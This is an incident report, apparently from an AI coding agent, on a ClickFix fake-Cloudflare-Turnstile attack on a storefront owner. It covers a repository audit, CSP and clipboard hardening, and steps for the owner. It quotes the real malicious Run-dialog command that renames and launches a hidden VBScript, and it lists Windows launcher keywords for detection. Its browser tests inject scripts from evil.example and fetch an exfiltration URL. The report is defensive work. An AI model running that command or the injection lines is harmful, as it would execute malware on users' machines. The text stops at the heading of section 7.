# INCIDENT REPORT — fake Cloudflare Turnstile / ClickFix attempt

| | |
|---|---|
| **Reported** | 2026-10-28 by the site owner |
| **Symptom** | Clicking the store's own cookie banner **"Accept all"** produced a fake *Cloudflare Turnstile* overlay telling the visitor to press **Win + R**, then **Ctrl + V**, then **Enter** — with a "Ref ID" block (`DQPF-ULGK-…-GK6T`) to make it look official |
| **Audited repository** | `Manesh844/maneshkumarcommissionagent` (public), branch `arena/85bce050-maneshkumarcommissionagent`, `HEAD` at audit time `2ebbd9f` |
| **Audit type** | Read-only IOC sweep first (working tree **and full git history**), then hardening. No file was deleted — nothing malicious was found |
| **Verdict** | **This repository WAS NOT tampered with.** The popup did not come from this code. See [Forensic verdict](#7-forensic-verdict) |
| **Still open** | `https://nukto.shop` is served from a **different, private repository** (`Manesh844/realonenukto`, Vercel root `nukto-shop`) that this audit could not read. See [What I could NOT rule out](#8-what-i-could-not-rule-out) — this is the most important paragraph in the document |

---

## 1. What the attack was

This is a **ClickFix** (also called *FakeCaptcha* / *VerifyFake*) social-engineering attack. It is not a vulnerability in a website — it is a trick that makes the **visitor** execute malware with their own hands, using the one thing no browser sandbox can stop: the Windows **Run** dialog.

How it normally works:

1. Something already on the machine (a malicious **browser extension**, adware, a compromised download, or an injected iframe from an ad network) paints a convincing "Verify you are human / Cloudflare Turnstile" panel on top of a page. It attaches itself to whatever the user clicks — very often a **cookie-consent button**, because that is a button every visitor clicks and because the click gives the injector a user-gesture to hang a popup on.
2. The panel says: press **Win + R**, press **Ctrl + V**, press **Enter**. The clipboard has already been silently filled with a command.
3. The command runs with the victim's own rights — no exploit, no CVE, no browser bug. Antivirus never sees a download, because the victim typed (pasted) the launch themselves.
4. A fake "Ref ID" (`DQPF-ULGK-…-GK6T`) is displayed purely to look like a legitimate Cloudflare case number. **Real Cloudflare Turnstile never asks you to open the Run dialog or paste anything, ever.**

### The exact malicious command from the clipboard

> ⚠️ **DO NOT RUN THIS.** It is reproduced here only as an indicator of compromise.

```bat
cmd /d /q /c for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*) do @if %~zf==218624 ren "%f" rt.vbs & wscript "%~dpf\rt.vbs"
```

What each part does:

| Fragment | Meaning |
|---|---|
| `cmd /d /q /c` | Start a shell with AutoRun disabled (`/d`), quiet (`/q`), run the command then exit (`/c`) — keeps the window invisible/short-lived |
| `for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*)` | Recursively walk the whole **Chrome profile tree** looking for files whose name starts with `f_` |
| `@if %~zf==218624` | `%~zf` is the **file size in bytes**. This selects exactly one file: the one that is **218,624 bytes** |
| `ren "%f" rt.vbs` | Rename that file to **`rt.vbs`** |
| `& wscript "%~dpf\rt.vbs"` | `%~dpf` = drive+path of the file → execute it with the **Windows Script Host** |

**The critical inference:** the command does not *download* anything. It *finds a file that is already on the disk* — a VBScript payload that was dropped earlier into the Chrome `User Data` folder under an innocuous `f_*` name (a folder that EDR products and users rarely inspect), identifies it by its exact byte size so the victim cannot pick the wrong file, renames it so Windows will run it, and launches it.

That tells us two things:

1. The machine was **already compromised before the popup appeared** — the dropper had run at some earlier point (most likely a malicious browser extension, an ad-network iframe, or a bundled installer).
2. The popup is the **activation step**, not the infection step. Closing the tab does not clean the machine; the payload is still sitting in `%LOCALAPPDATA%\Google\Chrome\User Data` waiting for a size-matched `ren`.

**If the owner pressed Enter**, treat the machine as fully compromised: assume every password, cookie, session token and crypto wallet in that Chrome profile was read by a script running as the user, and act on [§6 Manual steps](#6-manual-steps-for-the-owner-outside-this-repository) immediately.

**If the owner did NOT press Enter** (they stopped and reported it — which is what happened), the machine is probably not executed-on yet, but the dropper is likely still present and the profile is still exposed. Steps 1–5 below are still required.

### Find the dropped payload on the owner's PC (PowerShell, safe — read only)

```powershell
# 1) the exact file this command is looking for
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force -File -Filter 'f_*' -ErrorAction SilentlyContinue |
  Where-Object Length -eq 218624 | Select-Object FullName, Length, LastWriteTime

# 2) any script file hiding in the Chrome profile at all (should be NONE)
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force -File -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.vbs','.vbe','.jse','.wsf','.hta','.ps1','.bat','.cmd','.scr','.exe','.dll' } |
  Select-Object FullName, Length, LastWriteTime

# 3) persistence check: what runs at logon
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User
schtasks /query /fo LIST /v | Select-String -Pattern 'TaskName|Task To Run|Author'
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# 4) extensions (the most likely dropper) - review chrome://extensions in the browser too
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Extensions" -Directory -ErrorAction SilentlyContinue |
  Select-Object FullName, LastWriteTime
```

If step 1 returns a file: **do not double-click it.** Note the path, then run a full Windows Defender **Offline** scan plus a second-opinion scanner (§6 step 5) and delete what they flag.

---

## 2. IOC FINDINGS

Sweeps run over the **working tree** and over **every blob of every commit** (`git grep` against `git rev-list --all`, after `git fetch --unshallow`), plus the serving layer, the SQL, the Edge Functions, the catalog and the CSV/image data.

**Windows / ClickFix indicators — every one of these returned 0 hits, in the working tree and in all of git history:**

`wscript` · `cscript` · `mshta` · `cmd /d` · `cmd.exe` · `powershell` · `pwsh` · `-enc` · `%LOCALAPPDATA%` · `%APPDATA%` · `AppData\Roaming` · `Chrome\User Data` · `rt.vbs` · `f_*` · `218624` · `regsvr32` · `certutil` · `bitsadmin` · `schtasks` · `rundll32` · `Win + R` · `Ctrl + V` · `Ref ID` · `DQPF-ULGK` · `verify you are human` · `for /r` · `CreateObject` · `Shell.Application`

**Browser-side injection indicators — 0 hits:** `eval(` (as a call) · `new Function(` · `document.write(` · `atob(` · `importScripts(` · `navigator.sendBeacon` · `WebSocket` · `EventSource` · `XMLHttpRequest` · `serviceWorker` · any base64 blob longer than 200 characters inside `index.html` (**count: 0 in all 4 pre-existing commits**)

**Supply chain:** no `package.json`, no lockfile, no `node_modules`, no CI workflow, no `.npmrc`, no lifecycle (`postinstall`) script anywhere in the repo. Zero third-party runtime dependencies — there is nothing to pin and nothing that could have been poisoned through a registry.

**Serving layer:** no `middleware.js`, `_middleware.js`, `sw.js`, `service-worker.js`, `.htaccess`, `_redirects`, `_headers`, `netlify.toml`. Exactly one `vercel.json`, ever touched by 4 commits, and every rewrite it has ever contained points at `/index.html` (same origin). No proxy, no external redirect, ever.

**Secrets:** the only key in the shipped frontend is the Supabase **anon** JWT, which decodes to `{"iss":"supabase","ref":"vneknnmhnbkltkhihbok","role":"anon", …}` — that key is *designed* to be public. No `service_role` key, no JWT secret, no Brevo key, no `sk-`/`AKIA`/`xox*`/PEM material anywhere (the other `service_role` matches are prose in `README.md`/`TODO.md`/`DEPLOY_BACKEND.md` and comments in `.ts`/`.sql`).

### The table — every match that the sweeps *did* produce

Nothing below was deleted. Each line is a legitimate match that a keyword sweep flags, named as legitimate so a reviewer can confirm it in ten seconds.

| file | line | match | severity | verdict |
|---|---|---|---|---|
| `TODO.md` | 85 | "Cloudflare **Turnstile**" listed as a *future* to-do | info | **LEGITIMATE** — a roadmap note, no Turnstile code exists in the repo. Kept |
| `maneshkumarcommissionagent/DEPLOY_BACKEND.md` | 161 | same Turnstile to-do, backend section | info | **LEGITIMATE** — documentation only. Kept |
| `maneshkumarcommissionagent/functions/admin-auth/index.ts` | 65 | `btoa(JSON.stringify({u,r,exp}))` | info | **LEGITIMATE** — server-side admin session token, written during this session's admin-login work; never sent to a browser as executable code, no `eval`/`atob` pair. Kept |
| `maneshkumarcommissionagent/index.html` → now `app.js` | 3735 (old) | `navigator.clipboard.writeText(txt)` in `copyPay()` | medium (context) | **LEGITIMATE but hardened** — this is the "📋 Copy payment details" button copying the EasyPaisa/JazzCash account + amount. It is the only clipboard writer in the app and it is exactly the API the ClickFix payload abuses, so it is now routed through `safeCopyText()`, which refuses command-shaped text, and `lockClipboard()` wraps the raw API. Kept, guarded |
| `maneshkumarcommissionagent/index.html` | 953 | `<script src="catalog.js" defer>` | info | **LEGITIMATE** — same-origin generated catalogue; the **only** external script reference in the shipped HTML |
| `maneshkumarcommissionagent/index.html` | 1702 | Supabase anon JWT literal | info | **LEGITIMATE** — public client key by design; server-side work uses Edge Function secrets |
| `csvfiles/*.csv`, `uploads/*.csv`, `catalog.js` | many | `User Data`, `.scr`, `Ref ID`, `\.bat`, "verify" | noise | **LEGITIMATE FALSE POSITIVES** — product descriptions and marketing copy ("refreshing", "battery", "scrub", "reference id"). Data files, never executed |
| `maneshkumarcommissionagent/tests/harness.js` | 66, 113 | `new Function("window", …)` | info | **LEGITIMATE** — the Node test harness has to evaluate the app source; Node-only, never shipped (`tests/` is not referenced by any page) |
| `maneshkumarcommissionagent/tests/harness.js` | 675, 681 | `\x21\xff\x0bNETSCAPE2.0` | info | **LEGITIMATE** — GIF magic bytes used to validate a generated test fixture |
| `maneshkumarcommissionagent/index.html` | 2895–2896 (old) | `\x80`, `\x00` | info | **LEGITIMATE** — SHA-256 message padding inside the app's own hash implementation (used for admin password hashes) |
| `maneshkumarcommissionagent/index.html` | ~tagline | `\u00b0` | info | **LEGITIMATE** — a degree sign in a Roman-Urdu marketing string |

**Hosts referenced by the shipped HTML** (complete histogram, so nothing is hidden by "we checked the obvious ones"):

| host | count | what it is | verdict |
|---|---|---|---|
| `hhcnewapp.blr1.cdn.digitaloceanspaces.com` | 58 in HTML + 33,418 in `catalog.js` | product image/video CDN | **LEGITIMATE**, allow-listed in CSP `img-src`/`media-src` |
| `hhcnewapp.blr1.digitaloceanspaces.com` | 2,582 in `catalog.js` | product **video** CDN | **LEGITIMATE**, added to CSP `media-src` |
| `hhcdropshipping.b-cdn.net` | 10 | Bunny CDN video fallback | **LEGITIMATE**, allow-listed |
| `maneshkumarcommissionagent.dpdns.org` | 9 | canonical URL: `og:`, `twitter:`, `<link rel=canonical>`, JSON-LD, `SITE_DOMAIN`, one Brevo placeholder e-mail | **LEGITIMATE** — never a `<script src>` and never a `fetch()` target |
| `wa.me` | 8 | WhatsApp click-to-chat (`923420286170`) | **LEGITIMATE**, owner-mandated number |
| `vneknnmhnbkltkhihbok.supabase.co` | 1 | REST + Edge Functions | **LEGITIMATE**, CSP `connect-src` |
| `api.brevo.com` | 1 | order-confirmation e-mail | **LEGITIMATE**, CSP `connect-src` |
| `w3.org`, `schema.org` | 1 each | XML namespace / JSON-LD `@context` strings | **LEGITIMATE**, not network requests |
| `jazzcash.com.pk`, `easypaisa.com.pk` | 1 each | payment-instruction links (`<a href>`, `rel=noopener`) | **LEGITIMATE** |
| `xxxx.supabase.co` | 1 | placeholder in `DEPLOY_BACKEND.md` prose | **LEGITIMATE** |

**Every `fetch()` target in the application** (12 call sites) resolves to Supabase REST/RPC, Supabase Edge Functions (`checkout`, `password-reset`, `storefront-sync`, `admin-auth`) or `api.brevo.com/v3/smtp/email`. There is no fifth destination, no beacon, no analytics pixel, no websocket.

### Exfiltration assessment

**None.** There is no code in this repository that collects data and sends it to an attacker-controlled endpoint:

- No unknown external `<script src>`, `<iframe>`, `<object>`, `<embed>`, `link rel=preconnect/dns-prefetch` to a non-allow-listed host.
- No `sendBeacon`, no `WebSocket`, no `EventSource`, no `XMLHttpRequest`, no `Image()` tracker, no form posting to a third party (`form-action 'self'` now enforced).
- No obfuscation: zero base64 blobs > 200 chars, zero `eval`/`atob`/`document.write`/`fromCharCode` decoders in any commit.
- The only outbound destinations are the owner's own Supabase project and the owner's own Brevo account, both of which the storefront needs to function and both of which were already documented in `DEPLOY_BACKEND.md`.
- The only personal data collected is what a shop needs (name, phone, address, e-mail, order) and it goes to the owner's Supabase project over TLS with RLS enabled.

**Conclusion: this repository did not exfiltrate anything and cannot have produced the Turnstile overlay.**

---

## 3. Files changed, and why

Grouped exactly as requested: (1) malicious-code removal, (2) headers/CSP, (3) hardening, (4) docs.

### (1) Malicious code removed

**None — nothing was removed, because nothing malicious exists here.** No deletion was performed, so no diff is owed. This section is intentionally empty rather than padded with an unrelated cleanup.

### (2) `maneshkumarcommissionagent/vercel.json` — commit `937cfc2`

Merged into the **existing** `headers` block; nothing previously configured was removed, and the `/catalog.js`, image and `manifest.webmanifest` rules plus the three `/admin` rewrites are untouched.

| Change | Why |
|---|---|
| **Added `Content-Security-Policy`** to `/(.*)`: `default-src 'self'; base-uri 'self'; object-src 'none'; frame-src 'none'; frame-ancestors 'self'; upgrade-insecure-requests; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: + 3 media CDNs; media-src 'self' blob: + same 3 CDNs; connect-src 'self' + Supabase https/wss + api.brevo.com; font-src 'self' data:; form-action 'self'; worker-src 'self'` | This is the control that actually matters against this attack class. If an injector ever gets a foreign `<script>`/`<iframe>` into the page, the browser refuses to run it, and any `fetch()` to a host outside the owner's Supabase/Brevo is refused too. `frame-src 'none'` + `object-src 'none'` close the plugin/frame routes; `frame-ancestors 'self'` stops the shop being framed for clickjacking |
| **Added `media-src`** (not in the policy proposed in the incident brief) | Without it, `default-src 'self'` would have silently blocked **all 5,610 product videos** (`hhcnewapp.blr1.digitaloceanspaces.com`, `hhcdropshipping.b-cdn.net`) and broken the storefront. Added with the same allow-list as `img-src` |
| HSTS `max-age=31536000; includeSubDomains` → **`max-age=63072000; includeSubDomains; preload`** | Two years + preload eligibility, as specified |
| Permissions-Policy extended to `geolocation, camera, microphone, payment, usb, midi, magnetometer, accelerometer, gyroscope, display-capture, browsing-topics, interest-cohort` all `()` | The shop needs none of them; disabling removes a whole class of abusive-prompt attacks |
| Kept `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: strict-origin-when-cross-origin`, `Cross-Origin-Opener-Policy: same-origin` | Already present; verified correct and left alone |
| **No `Cross-Origin-Embedder-Policy`** added on purpose | `require-corp` would break the DigitalOcean/Bunny CDN media, which does not send `Cross-Origin-Resource-Policy`. Deliberate trade-off, noted here so nobody "fixes" it later and breaks videos |

> ⚠️ **Operational note:** the CSP is a hard allow-list. If the Supabase project
> is ever changed (the app also accepts an override in `localStorage["nukto.supabase"]`),
> or the media CDNs move, then `connect-src` / `img-src` / `media-src` in
> `vercel.json` **must be updated in the same change** — otherwise the storefront
> fails silently (images blank, videos dead, orders not saved) with errors only in
> the browser console. Verified today that every `fetch()` destination in the shipped
> `app.js` is inside `connect-src`: Supabase REST/RPC (`sbTable`, `supaFn` →
> `checkout`, `admin-auth`, `password-reset`, `storefront-sync`) and
> `api.brevo.com/v3/smtp/email`. Nothing else is fetched; `wa.me`, JazzCash and
> EasyPaisa are plain `<a href>` navigations, which CSP does not restrict.

`'unsafe-inline'` is retained in `script-src` **on purpose**, for two reasons: the pre-paint theme bootstrap must stay inline, and the markup uses inline `onclick=`/`oninput=` handlers throughout. The migration plan (and the trap that adding a `sha256-` hash while `'unsafe-inline'` is present *silently disables* `'unsafe-inline'` and would break every inline handler) is documented in an HTML comment directly above that bootstrap in `index.html` — `vercel.json` is strict JSON, so a comment cannot live inside it. **That migration was deliberately NOT performed in this change set.**

### (3) Hardening — commit `5936098`

| File | Change | Why |
|---|---|---|
| `maneshkumarcommissionagent/app.js` (**new**) | The two executable inline blocks (the offline `FALLBACK` catalogue + the whole ~4,790-line storefront/admin application) moved out of `index.html` into one same-origin external script | Task 3b. `index.html` drops from 450 KB to 72 KB, the app becomes cacheable, and the page has exactly one inline `<script>` left (the theme bootstrap). Loaded **without `defer`** at the identical position, so execution order is unchanged: markup → `app.js` → deferred `catalog.js` |
| `app.js` | `"use strict";` moved to the **first statement** of the file | Merging two script blocks into one file left the directive inert (it was no longer first), which would have silently dropped the entire application into sloppy mode. Fixed as part of the move |
| `app.js` | **`hostGuard()`** + `NUKTO_HOST_SUFFIXES` | Task 3e-1. The app runs only on `nukto.shop`, `www.nukto.shop`, `*.vercel.app`, `*.e2b.app`, `maneshkumarcommissionagent.dpdns.org`, `localhost`, `127.0.0.1`, `[::1]`, any IP (LAN preview) and `*.local`/`*.internal`. On any other host it refuses to render and shows an explicit "this copy of the store is not official — do not enter an address or advance payment" card, and tells the owner the one-line fix. Lookalikes such as `nukto.shop.evil.com` and `evil-nukto.shop` are refused because the suffix match requires a dot boundary |
| `app.js` | **`startInjectionWatch()`** | Task 3e-2. A `MutationObserver` on `head`, `documentElement` and `body` inspects every added `<script>/<iframe>/<object>/<embed>/<base>/<frame>`, **removes** it and reports it when the `src` is not same-origin or on the media/API allow-list. Protocol-relative `//evil.tld/x.js`, `javascript:`, `data:`, `vbscript:`, `blob:` and `file:` are refused outright. Inline scripts carrying a Windows-launcher pattern (`wscript`, `cmd /d`, `%LOCALAPPDATA%`, `CreateObject`, …) or a dynamic-code pattern (`eval`, `new Function`, `document.write`, `atob`, `importScripts`) are also removed. Existing nodes are scanned at startup |
| `app.js` | **`safeCopyText()`** — now the only clipboard writer; all three "📋 Copy details" buttons route through it | Task 3e-3. Refuses any text matching `NUKTO_CMD_PATTERN`: `cmd /d|/q|/c`, `cmd.exe`, `powershell`, `pwsh`, `wscript`, `cscript`, `mshta`, `regsvr32`, `certutil`, `bitsadmin`, `schtasks`, `rundll32`, `%LOCALAPPDATA%`, `%APPDATA%`, `User Data`, `CreateObject`, `.vbs`, `start-process`, `invoke-expression`, `iex`, `\system32\`, `..\`, and any backslash path. The legitimate copy (`03420286170 \| Amount Rs. 5200`) still works — asserted by a test so a future tightening cannot break the payment flow |
| `app.js` | **`lockClipboard()`** — wraps `navigator.clipboard.writeText` at boot | The assertion the brief asked for, made structural: even code this app did **not** write (an injected extension content script, a future third-party tag) cannot put a command-shaped string on the clipboard — the wrapped API rejects and reports instead |
| `app.js` | **`reportSecurity()`** → `localStorage["nukto.security"]` (newest 25) + `console.error` | An attack attempt must be visible, not silent. Every refusal (host, injection, clipboard) is logged with an ISO timestamp and a reason |
| `app.js` | New **"🛡️ Security events"** panel on the admin dashboard | The owner can see refusals without opening DevTools |
| `app.js` / `index.html` | `boot()` arms the three guards before the first render | Order matters: an unknown host must be refused *before* anything is painted |
| `index.html` | HTML comment above the theme bootstrap documenting the `'unsafe-inline'` removal plan; comment above `<script src="app.js">` stating that no third-party script is loaded anywhere | Task 3a's "comment explaining the plan", placed where JSON cannot hold one |
| `maneshkumarcommissionagent/tests/harness.js` | Now executes bootstrap + `app.js` and asserts against the **union** of `index.html` and `app.js`, so moving code between the two files can never silently weaken a test. **New section S: 66 assertions** | Proof, not promise: host allow-list incl. lookalikes, injected-`src` filtering, the **exact incident command**, the clipboard lock, consent isolation, script externalisation, and every CSP directive/header in `vercel.json`. Suite total **417 passed / 0 failed** |

**Cookie consent (task 3d) — audited, found compliant, not changed.** The whole path is: banner buttons (`cookieConsent(false)` / `cookieConsent(true)`) → `consent = val; store.set("nukto.consent", val); saveAll();` → hide `#cookiebar` → `analytics._consented = val; _saveAnalytics();` (400 ms debounce → `store.set("nukto.analytics", …)`). It writes `localStorage`, updates the UI and nothing else: **no `fetch()`, no `createElement`, no `appendChild`, no `window.open`, no iframe, no clipboard, no `eval`, no third-party script**. `saveAll()`'s only network effect is the existing debounced `pushCloud()` to the owner's own Supabase. Both facts are now regression-tested (a fetch counter asserts zero synchronous requests on accept).

**Task 3f (pin versions / drop unused deps / remove lifecycle scripts): nothing to do.** There is no `package.json`, no lockfile, no `node_modules`, no CI workflow, no `Makefile`, no `requirements.txt`, and no npm lifecycle script in this repository. The only build tool, `build_catalog.py`, imports Python stdlib only (`csv, json, re, os, math, random, collections, urllib.parse, glob`) — no network, no `subprocess`, no `eval`/`exec`. Adding a `package.json` just to have something to pin would *create* a supply-chain surface where there is currently none, so it was not added.

### (4) Documentation — this file

`INCIDENT.md` (repo root, **not** inside `maneshkumarcommissionagent/`, so it is never served publicly by Vercel) + a security section in `README.md`.

---

## 4. Verify (the owner runs these — this sandbox cannot reach the internet except github.com/npm/pypi)

### 4a. Zero unknown external `<script src>` in the production HTML

```bash
# every script tag the live page ships (expect ONLY same-origin relative srcs)
curl -s https://nukto.shop/ | grep -oiE '<script[^>]*src="[^"]*"' | sort -u
curl -s https://www.nukto.shop/ | grep -oiE '<script[^>]*src="[^"]*"' | sort -u
# and prove there is no absolute-URL script at all (expect NO output)
curl -s https://nukto.shop/ | grep -oiE '<script[^>]*src="https?:[^"]*"'
# every host the page mentions (eyeball this list — nothing unexpected should appear)
curl -s https://nukto.shop/ | grep -oE 'https?://[^"'"'"' )>]+' | sed -E 's#https?://([^/]+).*#\1#' | sort | uniq -c | sort -rn
```

Expected for this repository's build: `<script src="catalog.js" defer>` and `<script src="app.js">` — nothing else.

### 4b. CSP present on the apex **and** www

```bash
for u in https://nukto.shop https://www.nukto.shop; do
  echo "=== $u"
  curl -sI "$u" | egrep -i 'content-security-policy|strict-transport-security|x-frame-options|x-content-type-options|referrer-policy|permissions-policy|cross-origin-opener-policy'
done
```

Expect: `content-security-policy: default-src 'self'; …`, `strict-transport-security: max-age=63072000; includeSubDomains; preload`, `x-frame-options: SAMEORIGIN`, `x-content-type-options: nosniff`, `referrer-policy: strict-origin-when-cross-origin`, `permissions-policy: geolocation=(), camera=(), …`, `cross-origin-opener-policy: same-origin`.

> ⚠️ Until the changes in this repository are **mirrored into the `realonenukto` / `nukto-shop` repo** (§8), `https://nukto.shop` will **not** return a CSP header. That is expected, not a failure of this work.

### 4c. Browser-console CSP + guard test (2 minutes, do this on the deployed site)

Open the site → DevTools (F12) → **Console**, and paste each line one at a time:

| # | Paste | Expected result |
|---|---|---|
| 1 | `var s=document.createElement('script'); s.src='https://evil.example/x.js'; document.head.appendChild(s);` | Browser: `Refused to load the script 'https://evil.example/x.js' because it violates … "script-src 'self' 'unsafe-inline'"`. App: `[NUKTO GUARD] … injection-blocked: script -> https://evil.example/x.js`, the node is removed, and a row appears under **Admin → Dashboard → 🛡️ Security events** |
| 2 | `var f=document.createElement('iframe'); f.src='https://evil.example/'; document.body.appendChild(f);` | CSP `frame-src 'none'` refusal **and** `[NUKTO GUARD] … injection-blocked: iframe -> …` |
| 3 | `fetch('https://api.evil.tld/steal')` | CSP `connect-src` refusal — the request never leaves the browser |
| 4 | `navigator.clipboard.writeText('cmd /d /q /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf==218624 ren "%f" rt.vbs & wscript "%~dpf\\rt.vbs"')` | Promise **rejects**; console shows `[NUKTO GUARD] … clipboard-refused`. Then press **Ctrl+V** in Notepad: the clipboard must still hold whatever you copied before — the command never landed |
| 5 | `navigator.clipboard.writeText('03420286170 \| Amount Rs. 5200')` | **Allowed** (no guard message) — proves the filter has no false positive on real payment text |
| 6 | In the store UI, click **📋 Copy details** on a payment/advance popup, then Ctrl+V in Notepad | Account number + amount paste correctly |
| 7 | `localStorage.getItem('nukto.security')` | JSON array of the refusals from steps 1–4 |

### 4d. Nothing broke — functional smoke test

- [ ] `https://<host>/` renders the lemon storefront, no theme flash on a hard reload (Ctrl+Shift+R)
- [ ] Hash routes work: `#products`, `#product:<id>`, `#cart`, `#checkout`, `#orders`, `#admin`
- [ ] `/admin` and `/admin/` open the admin panel (Vercel rewrite intact)
- [ ] Products load from Supabase (not the offline `FALLBACK` list) — check Network for a `supabase.co/rest/v1/nukto_products` 200
- [ ] Search: type 2–3 characters, suggestions appear; Enter lands on results
- [ ] Cart: add / change qty / remove / subtotal / delivery fee by city (Karachi 179, Lahore 199, Quetta 249)
- [ ] Checkout: review popup → Advance Payment and Cash on Delivery both selectable; COD shows the mandatory-20%-advance note
- [ ] Cookie banner: **Accept all** and **Essential only** both dismiss it, the choice survives a reload, and **no Turnstile/overlay of any kind appears** (if one does → §8, the browser is infected, not the site)
- [ ] WhatsApp links open `wa.me/923420286170`
- [ ] CDN **images** load and product **videos** play (this is what `media-src` protects — if videos stop, the CSP is wrong)
- [ ] Winter mode / theme toggle still work, no console errors
- [ ] `node maneshkumarcommissionagent/tests/harness.js` → **417 passed, 0 failed**

---

## 5. What this audit could and could not see

| Scanned | Result |
|---|---|
| Working tree of `Manesh844/maneshkumarcommissionagent` (all files incl. 18 MB `catalog.js`, CSVs, images, SQL, Edge Functions) | clean |
| **Full git history** — unshallowed first (`git fetch --unshallow origin`), then `git grep` over every blob of all 4 pre-existing commits | clean |
| Every file extension ever added (97 jpg, 17 webp, 14 json, 10 csv, 8 sql, 7 py, 7 md, 6 ts, 6 png, 3 js, 2 svg, 1 each xml/webmanifest/txt/html/gif) | no `.vbs/.vbe/.hta/.ps1/.bat/.cmd/.scr/.lnk/.jse/.wsf/.exe/.dll` **has ever existed** |
| Magic bytes vs extension for every binary file (payload hidden as an image?) | 0 mismatches, 0 script/WSH markers inside any image |
| Commit identities, author-vs-committer, dates, force-push evidence | only the owner (`Manesh Kumar`/`Manesh844`) and Arena Agent; author≠committer only on the GitHub PR merge (normal) |
| Serving layer (`vercel.json` across history, middleware, service workers, `.htaccess`, `_redirects`, `_headers`) | clean |
| Secrets in the repo | only the public Supabase anon key (by design) |
| Vercel project `maneshkumarcommissionagent-maneshkumarcommissionagent` | exactly **one** deployment, production, from commit `2ebbd9f` on `main`, GitHub signature **verified**, created by the owner's account. No rogue or attacker-created deployment |
| Vercel account activity feed (last 25 events) | every event performed by `manesh844 <harwanimayyan012@gmail.com>`; all of it on the `realonenukto` projects on 2026-10-26. No unknown actor, no env-var change, no domain transfer |
| **`Manesh844/realonenukto` (the repo that actually builds `nukto.shop`)** | **NOT SCANNED — `403 Resource not accessible by integration`.** The token in this workspace cannot read it |
| **The deployed file tree of nukto.shop** | **NOT READABLE — `list_deployment_files` returns `404 File tree not found`** for both the nukto.shop production deployment and this project's deployment, so a live-vs-repo hash comparison could not be performed from here |
| Live HTTP response headers of `nukto.shop` | **not fetchable from this sandbox** (outbound network is limited to github.com, npmjs, pypi) — hence the copy-paste commands in §4 |

---

## 6. Manual steps for the owner (outside this repository)

These cannot be done from a code change. Do them in this order; 1–4 are credential rotations, 5 is the machine.

1. **Rotate the Supabase `service_role` key.** Supabase Dashboard → project `vneknnmhnbkltkhihbok` (`nukta-shop`) → *Project Settings → API* → rotate the secret/`service_role` key, then update it everywhere it is stored (Vercel/Edge Function secrets: `SUPABASE_SERVICE_ROLE_KEY` / `SERVICE_ROLE_KEY`). Anyone holding the old key could read and write **every** table, bypassing RLS, including `nukto_orders` and `nukto_admin_users`. Rotating invalidates the old key immediately; expect a few seconds of Edge Function errors until the new secret is deployed.
2. **Rotate the Brevo API key** (Brevo → *SMTP & API → API keys* → revoke + create), and update the Edge Function secret. Also rotate the payment-gateway webhook secret (`payment-webhook`) if one was ever issued. A leaked Brevo key lets an attacker send e-mail **as your domain** — that is a phishing channel straight to your customers.
3. **Rotate GitHub and Vercel credentials.**
   - GitHub → *Settings → Password and authentication*: change the password, **revoke every personal access token you do not recognise**, remove unknown SSH keys, and review *Settings → Applications / Authorized OAuth Apps* (remove anything unexpected). Then review **repository collaborators and Deploy keys** on `maneshkumarcommissionagent` **and** `realonenukto`, and *Settings → Security log* for logins you do not recognise.
   - Vercel → *Account Settings → Tokens*: delete any token you did not create (note: the deployment activity for nukto.shop on 2026-10-26 was performed with a token — confirm it is yours). Then *Account Settings → Members* (remove unknown members) and *Account Settings → Sessions* (sign out everywhere). Turn on 2FA with a **passkey/hardware key**, not SMS.
4. **Revoke old sessions everywhere the shop touches.**
   - Google account (this is the one that matters most — the payload lived inside the Chrome profile): *Google Account → Security → Your devices → Sign out of all devices*, then change the password and enrol a passkey.
   - Chrome: `chrome://settings/clearBrowserData` → **Cookies and other site data**, all time. This kills any session an attacker may already hold. Then review `chrome://extensions` and **remove every extension you did not install deliberately** (see §8 — this is the most probable source of the fake Turnstile).
   - Supabase Auth: Dashboard → *Authentication → Users* → sign out/revoke sessions for users you do not recognise.
   - The shop's own admin sessions: log out of `/admin` on every device and change the `Admin` and `Avinash` passwords. New hashes are produced with:
     `node -e "console.log(require('crypto').createHash('sha256').update(process.argv[1]).digest('hex'))" 'NEW-PASS'`
     then replace the corresponding hash in `app.js` (`ADMIN_HASH` / `BUILTIN_TEAM`) and the row in `nukto_admin_users`. **Never put the plaintext password back into the code or the tests.**
5. **Scan the PC properly** (a quick scan is not enough for a WSH dropper):
   - Windows Security → *Virus & threat protection → Scan options → **Microsoft Defender Offline scan*** (reboots and scans before Windows loads).
   - Second opinion: Malwarebytes Free **or** ESET Online Scanner **or** HitmanPro — run at least one; they catch what Defender misses.
   - AdwCleaner for the browser-hijacker/adware class specifically.
   - Run the four PowerShell commands in [§1](#1-what-the-attack-was) to locate the dropped `f_*` / 218,624-byte file, any script hiding in the Chrome profile, logon persistence (`Win32_StartupCommand`, `schtasks`, the Startup folder) and recently written extension folders.
   - Browser reset if anything is found: `chrome://settings/reset` → *Restore settings to their original defaults*. If the popup still appears in a **Chrome Guest window** or a **brand-new Windows user profile**, the infection is system-wide, not profile-wide — at that point back up data only (no executables) and rebuild the machine.
   - After cleaning: check `https://haveibeenpwned.com` for the owner's e-mail addresses, and watch the business bank/EasyPaisa/JazzCash accounts for unauthorised activity for 30 days.

### The rule — do not do this, ever

> **No legitimate website, CAPTCHA, Cloudflare, bank, courier or software update will ever ask you to press Win + R, open a terminal, or paste something you cannot see.**
>
> If a page — *especially one that appears right after you click "Accept cookies" or "I'm not a robot"* — tells you to press keyboard keys and paste: **close the tab. Do not press Enter. Do not run it.** Then treat the machine as compromised and follow §6.
>
> Corollaries: never disable antivirus "to complete a verification"; never paste into the Run dialog anything you did not type yourself; never install a browser extension that a website asks you to install to "continue"; and never copy a command from a web page into a shell without reading every character of it first.

---

## 7. Forensic verdict

